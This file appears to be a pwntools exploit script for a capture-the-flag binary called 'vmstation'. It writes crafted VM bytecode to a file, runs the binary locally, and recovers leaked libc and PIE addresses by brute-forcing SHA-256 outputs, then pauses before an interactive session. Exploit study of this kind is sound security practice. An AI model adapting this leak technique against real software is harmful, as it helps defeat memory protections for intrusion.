from pwn import *
from hashlib import sha256
context.log_level = "debug"

slog=lambda x,y:log.info(":".join([x,hex(y)]))

def crack(h,prev,b,c):
    for j in range(-0xffff,0xffff+1):
        txt=f"{prev|(j<<c)},{b},"+'0,'*14
        # print(txt.encode())
        if sha256(txt.encode()).hexdigest().encode()==h:
            if j>0:
                return j
            else:
                return j&0xffff
payload = \
    b'\x0b\x00\x00\xee'+\
    b'\x03\x01'+\
    b'\x0f\x00\x00\x01'+\
    b'\x06'+\
    b'\x03\x00'+\
    b'\x0b\x00\x00\xee'+\
    b'\x06'+\
    b'\x03\x00'+\
    b'\x0b\x00\x00\xed'+\
    b'\x06'+\
    b'\x03\x00\x03\x01'+\
    b'\x0b\x00\x00\xf2'+\
    b'\x03\x01'+\
    b'\x0f\x00\x00\x01'+\
    b'\x06'+\
    b'\x03\x00'+\
    b'\x0b\x00\x00\xf2'+\
    b'\x06'+\
    b'\x03\x00'+\
    b'\x0b\x00\x00\xf3'+\
    b'\x06'


f = open("./test","wb")
f.write(payload)
f.close()

r = process(['./vmstation','./test'])


def leak():
    cracked=0
    r.sendline(str(2**16).encode())
    h=r.recvline().strip()
    cracked=crack(h,cracked,2**16,0)
    r.sendline(str(0).encode())
    h=r.recvline().strip()
    cracked|=crack(h,cracked,2**16,16)<<16
    r.sendline(str(0).encode())

    cracked2=0

    h=r.recvline().strip()
    cracked2=crack(h,cracked2,2**16,0)

    return cracked|(cracked2<<32)
libc=leak()
r.sendline(str(0).encode())
r.sendline(str(0).encode())
pie=leak()

slog('libc',libc)
slog('pie',pie)

log.info(str(r.pid))
pause()





r.interactive()
